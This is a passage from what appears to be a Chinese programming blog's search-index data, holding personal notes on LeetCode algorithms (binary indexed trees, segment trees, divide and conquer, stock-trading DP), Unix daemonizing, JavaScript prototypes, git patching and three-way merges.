這樣與SVO一樣啊\n所以把時態(這裡叫他T)拉出來擋在主詞與O之間 S(T)VO =\u0026gt; OTSV\n時態 點就是時間點由\n起點 終點 組成，有的事件起點就是終點，就是那些沒有be Ving的動詞\n時態是由下面的四個屬性構成 過去 * will * have * Ving 過去: 點不在右下角? will: 點要往前放? have: 終點在這或是之前? Ving: 起點在前面?\n","permalink":"https://littlebees.github.io/2021/02/%E8%8B%B1%E6%96%87%E6%96%87%E6%B3%95%E9%9A%A8%E4%BE%BF%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e隨手筆記，不期待有人看懂，就只是做紀錄了\u003c/p\u003e\n\u003cp\u003e另外特別感謝google的natural language API\u003c/p\u003e","title":"英文文法隨便筆記"},{"content":"動機 翻翻The Pragmatic Programmer 20週年紀念版的一些紀錄我感覺很重要的部分\n節錄 Easy to change(ETC) DRY: 在一個系統中，每一條知識都必須有一個、單一、明確、權威的表現 ex: code, API, schema, 功能, 文件 正交性: 不互相影響，元件是self-contained 可逆性: 可以變動 曳光彈: 可以即時反饋、最簡化的系統 原形主要用在proof of concept，用完即丟，但曳光彈可以繼續發展下去 評估: 一項應該培養起來的技能 question -\u0026gt; build model -\u0026gt; design components -\u0026gt; give some assumed vals -\u0026gt; compute -\u0026gt; analyze estimates 用VCS(like git)控管 user setting (like .bashrc) editor setting (like .vimrc) 已安裝的software列表 ansible腳本 開發的repo 工作日誌 (以天為單位) 做了什麼 突然出現的想法 debug的變數 等等\u0026hellip; 合約式編程: precond, postcond, class invariant 如果有cond被打破就要跑補救措施 關於assertion 用assertion寫下不可能發生的事 assertion不要有state (X) assert(iter.next() != NULL) (O) obj=iter.next(); assert(obj != NULL) 除非這個assertion會有重大效能影響，不然就留著，可以對debug(from end-user)有很大的幫助 將設定(setting)用成一種service不是只有text file，可以方便取得數值與控制access 測試以attribute為基礎: 設定參數的範圍，之後random生，去測試 需求是一種流程(沒有一次就定下來的): 想法 \u0026lt;=\u0026gt; 疑問(某些edge case之類) 之間的反覆來回 不是跳出框框思考，而是找到框框 (邊界在哪) 支撐project的三項支柱 版本控制: drive build, test, deploy 的流程 回歸測試 完全自動化 TODO 身陷TDD，把test當成考題的例子 Constraint Propagation，感覺很屌\n","permalink":"https://littlebees.github.io/2021/02/the-pragmatic-programmer%E5%BF%AB%E9%80%9F%E7%BF%BB%E9%96%B1%E7%AF%80%E9%8C%84/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e翻翻The Pragmatic Programmer 20週年紀念版的一些紀錄我感覺很重要的部分\u003c/p\u003e","title":"The Pragmatic Programmer快速翻閱節錄"},{"content":"動機 個數、i\u0026lt;j，使用divide and conquer的時機!!\nProblem Given an integer array nums, return the number of reverse pairs in the array.\nA reverse pair is a pair (i, j) where 0 \u003c= i \u003c j \u003c nums.length and nums[i] \u003e 2 * nums[j].\nExample 1:\nInput: nums = [1,3,2,3,1]Output: 2Example 2:\nInput: nums = [2,4,3,5,1]Output: 3 Constraints:\n1 \u003c= nums.length \u003c= 5 * 104-231 \u003c= nums[i] \u003c= 231 - 1 Sol: divide and conquer 關於divide and conquer的時機，看LC327複習\n這裡想記錄的是lower_bound與upper_bound到底算出什麼?\nlower_bound: 第一個 大於等於(不小於) target的位置 upper_bound: 第一個 大於 target的位置\nclass Solution: def reversePairs(self, nums: List[int]) -\u0026gt; int: self.arr = nums return self.daq(0,len(nums)) def daq(self,l,r): if (r-l) \u0026lt;= 1: return 0 mid = l + (r-l) // 2 ret = self.daq(l,mid) + self.daq(mid,r) # nums[j] \u0026lt; nums[i]/2 是我們要的 # 要最右邊，也就是第一個不符合nums[j] \u0026lt; nums[i]/2 # !(nums[j] \u0026lt; nums[i]/2) =\u0026gt; nums[j] \u0026gt;= nums[i]/2 for i in range(l,mid): a = bisect_left(self.arr,(self.arr[i]+1)//2,mid,r) ret += a-mid self.arr[l:r] = sorted(self.arr[l:r]) return ret case study: binary index tree 這解法來自General principles behind problems similar to \u0026ldquo;Reverse Pairs\u0026rdquo;\n簡單總結一下裡面的內容，\n基本是break down into subproblems，有很多種方式，但這裡只看 T(i, j) = T(i, j - 1) + C T(i, j) = T(i, m) + T(m + 1, j) + C 對於第一種，因為每次都要看有多少是符合的，所以要search 只用linear search會變O(n^2) 如果search space是 不會變動的(static)，用binary search，但是這裡每次處理完一個就要加到search space，所以不能用 變動的，用binary seach tree，平衡加入search space與search的成本，但是不會自平衡就會退化成O(n^2) (這我自己加的) 因為求的是個數，如果後面的個數會包含前面的個數就可以用bit 第二種就看前面 private int search(int[] bit, int i) { int sum = 0; while (i \u0026lt; bit.length) { sum += bit[i]; i += i \u0026amp; -i; } return sum; } private void insert(int[] bit, int i) { while (i \u0026gt; 0) { bit[i] += 1; i -= i \u0026amp; -i; } } public int reversePairs(int[] nums) { int res = 0; int[] copy = Arrays.copyOf(nums, nums.length); int[] bit = new int[copy.length + 1]; Arrays.sort(copy); for (int ele : nums) { res += search(bit, index(copy, 2L * ele + 1)); insert(bit, index(copy, ele)); } return res; } private int index(int[] arr, long val) { int l = 0, r = arr.length - 1, m = 0; while (l \u0026lt;= r) { m = l + ((r - l) \u0026gt;\u0026gt; 1); if (arr[m] \u0026gt;= val) { r = m - 1; } else { l = m + 1; } } return l + 1; } ","permalink":"https://littlebees.github.io/2021/02/leetcode-493-reverse-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e個數、\u003ccode\u003ei\u0026lt;j\u003c/code\u003e，使用divide and conquer的時機!!\u003c/p\u003e","title":"leetcode-493 - Reverse Pairs"},{"content":"動機 使用divide and conquer的時機是?\nProblem Given an integer array nums and two integers lower and upper, return the number of range sums that lie in [lower, upper] inclusive.\nRange sum S(i, j) is defined as the sum of the elements in nums between indices i and j inclusive, where i \u003c= j.\nExample 1:\nInput: nums = [-2,5,-1], lower = -2, upper = 2Output: 3Explanation: The three ranges are: [0,0], [2,2], and [0,2] and their respective sums are: -2, -1, 2.Example 2:\nInput: nums = [0], lower = 0, upper = 0Output: 1 Constraints:\n1 \u003c= nums.length \u003c= 105-231 \u003c= nums[i] \u003c= 231 - 1-105 \u003c= lower \u003c= upper \u003c= 105The answer is guaranteed to fit in a 32-bit integer. Sol1: binary search (i \u0026gt; j，i是現在算到的prefix sum) lower \u0026lt;= sum[i]-sum[j] \u0026lt;= upper -sum[i]+lower \u0026lt;= -sum[j] \u0026lt;= -sum[i]+upper sum[i]-lower \u0026gt; sum[j] \u0026gt; sum[i]-upper 這樣就變成只要找有沒有sum[j]就好，那個數要怎麼辦? 回想LC315，sorted list的index，就是前面有幾個比自己小\n因此，把兩個位置相減就是我們要的\nfrom sortedcontainers import SortedList class Solution: def countRangeSum(self, nums: List[int], lower: int, upper: int) -\u0026gt; int: # lower \u0026lt;= sum[i]-sum[j] \u0026lt;= upper # -sum[i]+lower \u0026lt;= -sum[j] \u0026lt;= -sum[i]+upper # sum[i]-lower \u0026gt; sum[j] \u0026gt; sum[i]-upper sums = SortedList() sums.add(0) total = 0 ret = 0 for n in nums: total += n ret += (bisect_right(sums,total-lower) - bisect_left(sums,total-upper)) sums.add(total) return ret Sol2: divide and conquer divide and conquer時如果分成左右兩邊，右邊的index都會比左邊大，所以可以直接在右邊找有沒有符合的\n如果只是要找個數，利用右邊的index都會比左邊大的特點，就可以用divide and conquer\nclass Solution: def countRangeSum(self, nums: List[int], lower: int, upper: int) -\u0026gt; int: if not nums: return 0 self.lower, self.upper = lower, upper self.sums = [0] self.nums = nums for i in range(len(nums)): self.sums.append(nums[i]+self.sums[i]) return self.diq(0,len(nums)+1) def diq(self,l,r): if (r-l) \u0026lt;= 1: return 0 mid = l + (r-l) // 2 ret = self.diq(l,mid) + self.diq(mid,r) i,j = mid, mid for k in range(l,mid): # lower \u0026lt;= sum[i]-sum[j] \u0026lt;= upper while (j \u0026lt; r) and ((self.sums[j] - self.sums[k]) \u0026lt; self.lower): j += 1 while (i \u0026lt; r) and ((self.sums[i] - self.sums[k]) \u0026lt;= self.upper): i += 1 ret += (i-j) self.sums[l:r] = sorted(self.sums[l:r]) # 我懶得用merge return ret case study: binary index tree 因為這裡要算的是range count，剛好是bit的守備範圍(range中的count總數)，只要有一個range被碰到，update時count就可以一路更新上去\n也因為要看被碰到的range，所以不能只算prefix sum，要連同扣過上下限的prefix sum一起看，這樣如果落在上下限的prefix sum時才會被更新到\nclass BIT: def __init__(self, n): self.n = n self.tree = [0] * (n + 1) def update(self, x, delta): while x \u0026lt;= self.n: self.tree[x] += delta x += x \u0026amp; -x def query(self, x): res = 0 while x \u0026gt; 0: res += self.tree[x] x -= x \u0026amp; -x return res class Solution: def countRangeSum(self, nums: List[int], lower: int, upper: int) -\u0026gt; int: if not nums: return 0 presum = 0 values = set([0]) for x in nums: presum += x values.add(presum) values.add(presum - lower) values.add(presum - upper) # mapping sparse ordered values to 1 ~ n x2i = {x: i + 1 for i, x in enumerate(sorted(set(values)))} bit = BIT(len(x2i)) bit.update(x2i[0], 1) # should add the sum of empty prefix array res = cur = 0 # calculate the pairs on flight for i, x in enumerate(nums): cur += x l = bit.query(x2i[cur - upper] - 1) r = bit.query(x2i[cur - lower]) res += r - l bit.update(x2i[cur], 1) return res ","permalink":"https://littlebees.github.io/2021/02/leetcode-327-count-of-range-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e使用divide and conquer的時機是?\u003c/p\u003e","title":"leetcode-327 - Count of Range Sum"},{"content":"動機 當初看binary index tree看了很久，要記錄一下\nbinary index tree tree的樣子 build 因為是prefix sum所以如果從底部往上建，就是把目前建好的node往上一層送\n像是1~1就是1~2的前半部，1~4就是1~2與3~3\n那要怎麼決定要往那一個地方送? 這就是特別的地方了，往n+lowbit(n)\nlowbit定義成離左邊(最低位)最近的第一個1，像\nlowbit(1) =\u0026gt; 1 lowbit(2) =\u0026gt; 2 lowbit(3) =\u0026gt; 1 因為每次往上都是遞增一個lowbit(n)，所以很像list\ndef __init__(self,arr): self.n = len(arr) self.bit = [0] * (1+self.n) for (i,n) in enumerate(arr): i += 1 # bit start from 1 self.bit[i] += n nextI = i + (i\u0026amp;(-i)) # lowbit(i) if nextI \u0026lt;= self.n: self.bit[nextI] += self.bit[i] update 剛剛的build是從底往上，update也是所以兩個很像\ndef update(self,i,diff): while i \u0026lt;= self.n: self.bit[i] += diff i += (i\u0026amp;(-i)) query build與update都是往上加lowbit(n)，query可以類推成扣lowbit(n)? 對\ndef query(self,n): # [1..n] ret = 0 while n \u0026gt; 0: ret += self.bit[n] n -= (n\u0026amp;(-n)) return ret 為什麼是lowbit? 從lowbit去看每個區間會發現lowbit(n)到左邊(最低位)的距離就是會有幾個區間要加，像\nlowbit(1) =\u0026gt; 0 (就是自己) lowbit(2) =\u0026gt; 1 (1~1與自己) lowbit(4) =\u0026gt; 2 (1~2與3~3與自己) 還有lowbit(n)到左邊(最低位)的range，如果有1可以看成有幾個node，像\n1~5 =\u0026gt; 101，1~4與5~5 1~7 =\u0026gt; 111，1~4與5~6與7~7 從這裡也可以看出來，為什麼bit的query是1~n，因為是透過binary去看有幾個1去加總\n所以，bit就是利用binary來表示有幾個區間的prefix sum tree\nRef 這應該是最好懂bit的資料\n","permalink":"https://littlebees.github.io/2021/02/binary-index-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初看binary index tree看了很久，要記錄一下\u003c/p\u003e","title":"binary index tree"},{"content":"動機 segment tree 與 binary index tree的練習題\nProblem Given an integer array nums, handle multiple queries of the following types:\nUpdate the value of an element in nums.Calculate the sum of the elements of nums between indices left and right inclusive where left \u003c= right.Implement the NumArray class:\nNumArray(int[] nums) Initializes the object with the integer array nums.void update(int index, int val) Updates the value of nums[index] to be val.int sumRange(int left, int right) Returns the sum of the elements of nums between indices left and right inclusive (i.e. nums[left] + nums[left + 1] + ... + nums[right]). Example 1:\nInput[NumArray, sumRange, update, sumRange][[[1, 3, 5]], [0, 2], [1, 2], [0, 2]]Output[null, 9, null, 8]ExplanationNumArray numArray = new NumArray([1, 3, 5]);numArray.sumRange(0, 2); // return 1 + 3 + 5 = 9numArray.update(1, 2); // nums = [1, 2, 5]numArray.sumRange(0, 2); // return 1 + 2 + 5 = 8 Constraints:\n1 \u003c= nums.length \u003c= 3 * 104-100 \u003c= nums[i] \u003c= 1000 \u003c= index \u003c nums.length-100 \u003c= val \u003c= 1000 \u003c= left \u003c= right \u003c nums.lengthAt most 3 * 104 calls will be made to update and sumRange. Sol1: segment tree 就是在complete binary tree中放入range與sum的訊息，用dfs的方式去建tree\nquery就是做區間比較，update就是從最底的點開始往上更新\nclass Node: def __init__(self,i,j,val): self.i = i self.j = j # i \u0026lt; j, always self.mid = i + (j-i) // 2 self.val = val self.left = None self.right = None def query(root,i,j): if not root or i \u0026lt; 0 or j \u0026lt; 0: return 0 if i == root.i and root.j == j: return root.val elif j \u0026lt; root.mid: return query(root.left, i, j) elif i \u0026gt; root.mid: return query(root.right, i ,j) else: return query(root.left, i, root.mid)+query(root.right, root.mid, j) def update(root,i,val): if root.i == i and root.j-root.i == 1: diff = val - root.val # new - old = diff =\u0026gt; new = old + diff root.val = val return diff else: if i \u0026lt; root.mid: diff = update(root.left, i, val) else: diff = update(root.right, i, val) root.val += diff return diff def build(arr,i,j): if i \u0026gt;= j: return Node(i,j,0) elif j-i == 1: return Node(i,j,arr[i]) else: mid = i + (j-i) // 2 root = Node(i,j,\u0026#39;wait for left and right\u0026#39;) root.left = build(arr, i, mid) root.right = build(arr, mid, j) root.val = root.left.val + root.right.val return root class NumArray: def __init__(self, nums: List[int]): self.root = build(nums,0, len(nums)) self.size = len(nums) def update(self, index: int, val: int) -\u0026gt; None: if 0 \u0026lt;= index \u0026lt; self.size: update(self.root,index,val) def sumRange(self, left: int, right: int) -\u0026gt; int: return query(self.root, left, right+1) Sol2: binary index tree(BIT) 雖然叫binary index tree但實際上走訪的方式比較像list，但是呈現出來的結構是tree。\n之後會有一篇單獨做筆記，這邊先提BIT與segment tree不一樣的地方\nBIT的query是 1~n segment tree的query a~b\nclass BIT: def __init__(self,arr): self.n = len(arr) self.bit = [0] * (1+self.n) for (i,n) in enumerate(arr): i += 1 # bit start from 1 self.bit[i] += n nextI = i + (i\u0026amp;(-i)) if nextI \u0026lt;= self.n: self.bit[nextI] += self.bit[i] def query(self,n): # [1..n] ret = 0 while n \u0026gt; 0: ret += self.bit[n] n -= (n\u0026amp;(-n)) return ret def update(self,i,diff): while i \u0026lt;= self.n: self.bit[i] += diff i += (i\u0026amp;(-i)) class NumArray: def __init__(self, nums: List[int]): self.nums = list(nums) self.bit = BIT(nums) #print(self.bit.bit) def update(self, index: int, val: int) -\u0026gt; None: diff = val - self.nums[index] self.nums[index] = val self.bit.update(index+1, diff) #print(self.bit.bit) def sumRange(self, left: int, right: int) -\u0026gt; int: return self.bit.query(right+1)-self.bit.query(left) ","permalink":"https://littlebees.github.io/2021/02/leetcode-307-range-sum-query-mutable/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esegment tree 與 binary index tree的練習題\u003c/p\u003e","title":"leetcode-307 - Range Sum Query - Mutable"},{"content":"動機 重灌電腦遇到紀錄一下\nSol 點開始旁邊的放大鏡打Services，點元件服務 點服務(本機)，找Credential Manager Service 把啟動類型改成自動，點確定 reboot Ref Utils, Windows, 10 Getting Error Message (0x80070425) when adding account in Mail App.\n","permalink":"https://littlebees.github.io/2021/02/%E8%A8%AD%E5%AE%9Awindows-mail%E5%87%BA%E7%8F%BE0x80070490%E7%9A%84%E9%8C%AF%E8%AA%A4%E7%A2%BC/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e重灌電腦遇到紀錄一下\u003c/p\u003e","title":"設定windows-mail出現0x80070490的錯誤碼"},{"content":"動機 碰到daemonize來記錄一下\nSID, PGID process都有一個pid 一堆process可以組成process group，就會有一個pgid group收到的signal會送給旗下所有的process 一堆process group可以組成session，就會有一個sid session會綁定到一個tty daemonize daemon的目的\n在背景執行 獨立於其他session (自成一體) tty不見了也要能動 (獨立於tty) 所以daemonize的步驟是\nfork一個子process 讓父process退出 (子process現在與父process無關，在背景執行) 在子process創立新的session (獨立於其他session) 因為是該session的第一個session，所以會與tty綁定 另外，此時也可以 把不需要fd關掉 把umask設好，也許parent的不符合daemon的需求 fork一個子process (獨立於tty) try: pid = os.fork() if pid \u0026gt; 0: # Exit first parent sys.exit(0) except OSError as e: sys.stderr.write( \u0026#34;fork #1 failed: %d (%s)\\n\u0026#34; % (e.errno, e.strerror)) sys.exit(1) # Decouple from parent environment os.chdir(self.home_dir) os.setsid() os.umask(self.umask) # Do second fork try: pid = os.fork() if pid \u0026gt; 0: # Exit from second parent sys.exit(0) except OSError as e: sys.stderr.write( \u0026#34;fork #2 failed: %d (%s)\\n\u0026#34; % (e.errno, e.strerror)) sys.exit(1) Ref Daemonize 一个进程为什么需要 fork 两次\n","permalink":"https://littlebees.github.io/2021/02/daemonize%E8%88%87sig%E8%88%87pgid/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e碰到daemonize來記錄一下\u003c/p\u003e","title":"daemonize與sig與pgid"},{"content":"動機 之前在看js的proto時，突然想起之前看的metaclass\nproto就是上一層 原本是說物件是在這層沒有找到就要往上找，在js就是proto\n物件的上一層就是class，class的上一層就是parent\nvar nick = new Person(\u0026#39;nick\u0026#39;, 18); console.log(nick.__proto__ === Person.prototype) // true js只有一個指標，但metaclass有兩個，why? js只有一個指標，所以很好懂，也很直覺，但\n這樣就不能玩metaclass的那些奇異功能，因為所有method都放在同一個地方 不好模擬private，因為所有method都放在同一個地方，像js要自己用clousre包 js的this 會要這個就是method阿，也就是說，js把method當成一級function用\u0026hellip;\n但this因為是關鍵字，所以不能用單純的變數去看\n如果在object中宣告，以及在被調用時有使用物件，就用物件作為this 如果都沒有就是windows(global) 順便記一下: JavaScript是synchronous在執行的 function waitThreeSeconds(){ var ms = 3000 + new Date().getTime(); while(new Date() \u0026lt; ms){} console.log(\u0026#34;finished function\u0026#34;); } function clickHandler(){ console.log(\u0026#34;click event!\u0026#34;); } document.addEventListener(\u0026#39;click\u0026#39;, clickHandler); console.log(\u0026#34;started execution\u0026#34;); waitThreeSeconds(); console.log(\u0026#34;finished execution\u0026#34;); /* started execution finished execution click event! * n */ 在等的時候點擊，waitThreeSeconds沒有被中斷，而是會等到跑完再反映事件\n先把execution context的內容執行完畢，接著才去執行\u0026quot;event queue\u0026quot;\nRef 該來理解 JavaScript 的原型鍊了 談談 JavaScript 中的 \u0026ldquo;this\u0026rdquo; 和它的問題 談談JavaScript中的asynchronous和event queue\n","permalink":"https://littlebees.github.io/2021/02/js%E7%9A%84proto%E8%88%87metaclass/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前在看js的proto時，突然想起之前看的metaclass\u003c/p\u003e","title":"js的proto與metaclass"},{"content":"動機 之前遇到，要apply一個patch到十分類似的檔案，雖然說十分類似，但還是會想說會不會因為有不同的地方所以會報錯之類的，結果沒有，所以記錄一下\npatch git diff HEAD^ -- hello.test \u0026gt; ~/patch_file cd ../second-repo patch -p1 blue/red/hi.test ~/patch_file 直接用就好，順便說一下，patch的-p是把patchfile中的path扣去一位的意思，例如\n/a/b/c =\u0026gt;(-p1) a/b/c /a/b/c =\u0026gt;(-p3) c Ref How to apply a Git patch to a file with a different name and path? patch man\n","permalink":"https://littlebees.github.io/2021/02/apply-patch%E5%88%B0%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8D%E5%90%8C%E7%9A%84%E6%AA%94%E6%A1%88%E5%90%8D%E7%9A%84%E6%AA%94%E6%A1%88/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前遇到，要apply一個patch到十分類似的檔案，雖然說十分類似，但還是會想說會不會因為有不同的地方所以會報錯之類的，結果沒有，所以記錄一下\u003c/p\u003e","title":"apply patch到在不同資料夾不同的檔案名的檔案"},{"content":"動機 之前有遇過，但沒有好好認識他，來記錄一下\nthree-ways mrege 原本只有兩個檔案做diff，這樣沒辦法分辨要留下哪一個，只能標出哪邊不一樣\n所以還需要一個共同來源的檔案，來做基準\n那要怎麼確定要把哪個改動留下來? 只要其中一個檔案沒變過，另外一個卻變了，就要保留這個變化\nRecursive three-ways merge 如果要merge兩個merge commit，就有可能遇到圖上的狀況，這樣無法決定要取哪一個commit，所以這裡就把這兩個commit做merge，用這個新commit做共同祖先\n另外，cherry-pick也是three-ways mrege，只不過祖先是取被cherry-pick的commit的前一個\nRef Git三路合并算法(Three Way Merge)\n","permalink":"https://littlebees.github.io/2021/02/git-conflict-%E8%88%87-three-ways-merge/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前有遇過，但沒有好好認識他，來記錄一下\u003c/p\u003e","title":"git conflict 與 three-ways-merge"},{"content":"動機 一直很疑惑input與bigO之間的n大概是多少，所以把參考的表格存一份在這裡\n上結論 Length of Input (N) Worst Accepted Algorithm ≤[10..11] O(N!),O(N6) ≤[15..18] O(2N∗N2) ≤[18..22] O(2N∗N) ≤100 O(N4) ≤400 O(N3) ≤2K O(N2∗logN) ≤10K O(N2) ≤1M O(N∗logN) ≤100M O(N),O(logN),O(1) Ref Time and Space Complexity\n","permalink":"https://littlebees.github.io/2021/01/bigo%E5%B0%8D%E6%87%89%E5%88%B0%E7%9A%84input%E5%A4%A7%E5%B0%8F/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e一直很疑惑input與bigO之間的n大概是多少，所以把參考的表格存一份在這裡\u003c/p\u003e","title":"bigO對應到的input大小"},{"content":"動機 不要被BST誤導阿!!! 一直往O(log(n))的方向去想\nProblem Given the root of a binary search tree, and an integer k, return the kth (1-indexed) smallest element in the tree.\nExample 1:\nInput: root = [3,1,4,null,2], k = 1Output: 1Example 2:\nInput: root = [5,3,6,2,4,null,null,1], k = 3Output: 3 Constraints:\nThe number of nodes in the tree is n.1 \u003c= k \u003c= n \u003c= 1040 \u003c= Node.val \u003c= 104 Follow up: If the BST is modified often (i.e., we can do insert and delete operations) and you need to find the kth smallest frequently, how would you optimize? Sol 做中序去找第k個\n心得\n0 是 False 沒有log(n)，沒有log(n)，沒有log(n) def dfs(r,k,acc): if not r: return [None, acc] elif not r.left and not r.right: return [r.val,acc+1] else: ret = dfs(r.left,k,acc) # 0 is False in Python3 !!!! if ret[0] != None and k == ret[1]: return ret ret[0] = r.val ret[1] += 1 if ret[0] != None and k == ret[1]: return ret return dfs(r.right,k,ret[1]) class Solution: def kthSmallest(self, r: TreeNode, k: int) -\u0026gt; int: return dfs(r,k,0)[0] ","permalink":"https://littlebees.github.io/2021/01/leetcode-230-kth-smallest-element-in-a-bst/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不要被BST誤導阿!!!\n一直往O(log(n))的方向去想\u003c/p\u003e","title":"leetcode-230 - Kth Smallest Element in a BST"},{"content":"動機 用算k個的dp就可以解這題，但是想介紹當初沒有用dp的解法\nProblem You are given an array prices where prices[i] is the price of a given stock on the ith day.\nFind the maximum profit you can achieve. You may complete at most two transactions.\nNote: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again).\nExample 1:\nInput: prices = [3,3,5,0,0,3,1,4]Output: 6Explanation: Buy on day 4 (price = 0) and sell on day 6 (price = 3), profit = 3-0 = 3.Then buy on day 7 (price = 1) and sell on day 8 (price = 4), profit = 4-1 = 3.Example 2:\nInput: prices = [1,2,3,4,5]Output: 4Explanation: Buy on day 1 (price = 1) and sell on day 5 (price = 5), profit = 5-1 = 4.Note that you cannot buy on day 1, buy on day 2 and sell them later, as you are engaging multiple transactions at the same time. You must sell before buying again.Example 3:\nInput: prices = [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit = 0.Example 4:\nInput: prices = [1]Output: 0 Constraints:\n1 \u003c= prices.length \u003c= 1050 \u003c= prices[i] \u003c= 105 Sol 最多只做兩次，所以可以算只做一次的最大與兩次的最大\n兩次的最大透過\n從左看過去到第i天最大的交易 從右看過去到第i天最大的交易 相加\n# @param {Integer[]} prices # @return {Integer} # k = 1 def f(prices) lowest_price = prices[0] ans = 0 i = 1 while i \u0026lt; prices.size lowest_price = [lowest_price,prices[i]].min ans = [ans, prices[i]-lowest_price].max i+=1 end return ans end def max_profit(ps) fore = ps.clone back = ps.clone back[-1] = back[0] = 0 fore[-1] = fore[0] = 0 small = ps[0] (1...ps.size).each do |i| fore[i] = ps[i]-small \u0026gt; fore[i-1]? ps[i]-small : fore[i-1] small = [small, ps[i]].min end big = ps[-1] (ps.size-2).downto(1).each do |i| back[i] = big-ps[i]\u0026gt;back[i+1]? big-ps[i] : back[i+1] big = [big, ps[i]].max end p fore p back back.shift back.push 0 ans = 0 (0...ps.size).each do |i| ans = [ans, back[i]+fore[i]].max end return [ans, f(ps)].max end ","permalink":"https://littlebees.github.io/2021/01/leetcode-123-best-time-to-buy-and-sell-stock-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用算k個的dp就可以解這題，但是想介紹當初沒有用dp的解法\u003c/p\u003e","title":"leetcode-123 - Best Time to Buy and Sell Stock III"},{"content":"動機 與309、188一起看效果更佳\nProblem You are given an array prices where prices[i] is the price of a given stock on the ith day, and an integer fee representing a transaction fee.\nFind the maximum profit you can achieve. You may complete as many transactions as you like, but you need to pay the transaction fee for each transaction.\nNote: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again).\nExample 1:\nInput: prices = [1,3,2,8,4,9], fee = 2Output: 8Explanation: The maximum profit can be achieved by:- Buying at prices[0] = 1- Selling at prices[3] = 8- Buying at prices[4] = 4- Selling at prices[5] = 9The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8.Example 2:\nInput: prices = [1,3,7,5,10,3], fee = 3Output: 6 Constraints:\n1 \u003c= prices.length \u003c= 5 * 1041 \u003c= prices[i] \u003c 5 * 1040 \u003c= fee \u003c 5 * 104 Sol 現在是在賣的時候要手續費\n所以原本的式子，在賣的時候要扣$$\nbuy[i] = sell[i-1] - prices[i] | buy[i-1] sell[i] = buy[i-1] + prices[i] | sell[i-1] buy[i] = sell[i-1] - prices[i] | buy[i-1] sell[i] = buy[i-1] + prices[i] - fee | sell[i-1] class Solution: @functools.cache def buy(self,i): if i \u0026lt; 0: return 0 elif i == 0: return -self.prices[i] else: return max(self.sell(i-1)-self.prices[i], self.buy(i-1)) @functools.cache def sell(self,i): if i \u0026lt;= 0: return 0 else: return max(self.buy(i-1)+self.prices[i] - self.fee,self.sell(i-1)) def maxProfit(self, prices: List[int], fee: int) -\u0026gt; int: self.fee = fee self.prices = prices return self.sell(len(prices)-1) ","permalink":"https://littlebees.github.io/2021/01/leetcode-714-best-time-to-buy-and-sell-stock-with-transaction-fee/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e與309、188一起看效果更佳\u003c/p\u003e","title":"leetcode-714 - Best Time to Buy and Sell Stock with Transaction Fee"},{"content":"動機 可以當成188的暖身題\nProblem You are given an array prices where prices[i] is the price of a given stock on the ith day.\nFind the maximum profit you can achieve. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times) with the following restrictions:\nAfter you sell your stock, you cannot buy stock on the next day (i.e., cooldown one day).Note: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again).\nExample 1:\nInput: prices = [1,2,3,0,2]Output: 3Explanation: transactions = [buy, sell, cooldown, buy, sell]Example 2:\nInput: prices = [1]Output: 0 Constraints:\n1 \u003c= prices.length \u003c= 50000 \u003c= prices[i] \u003c= 1000 Sol 把buy與sell分開，要算出在買與賣之間的最大收益\nbuy[i] = sell[i-1] - prices[i] | buy[i-1] sell[i] = buy[i-1] + prices[i] | sell[i-1] 但這是看前一天的，現在賣完要慢一天才能買，所以改成\nbuy[i] = sell[i-2] - prices[i] | buy[i-1] sell[i] = buy[i-1] + prices[i] | sell[i-1] class Solution: @functools.cache def buy(self,i): if i \u0026lt; 0: return 0 elif i == 0: return -self.prices[i] else: return max(self.sell(i-2)-self.prices[i], self.buy(i-1)) @functools.cache def sell(self,i): if i \u0026lt;= 0: return 0 else: return max(self.buy(i-1)+self.prices[i],self.sell(i-1)) def maxProfit(self, prices: List[int]) -\u0026gt; int: # buy[i] = sell[i-1] - prices[i] | buy[i-1] # sell[i] = buy[i-1] + prices[i] | sell[i-1] # buy must be delayed, which has cooldown before sell # take sell[i-2] when do buy self.prices = prices return self.sell(len(prices)-1) ","permalink":"https://littlebees.github.io/2021/01/leetcode-309-best-time-to-buy-and-sell-stock-with-cooldown/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e可以當成188的暖身題\u003c/p\u003e","title":"leetcode-309 - Best Time to Buy and Sell Stock with Cooldown"},{"content":"動機 經典的stock系列題目的開始\nProblem You are given an array prices where prices[i] is the price of a given stock on the ith day.\nYou want to maximize your profit by choosing a single day to buy one stock and choosing a different day in the future to sell that stock.\nReturn the maximum profit you can achieve from this transaction. If you cannot achieve any profit, return 0.\nExample 1:\nInput: prices = [7,1,5,3,6,4]Output: 5Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5.Note that buying on day 2 and selling on day 1 is not allowed because you must buy before you 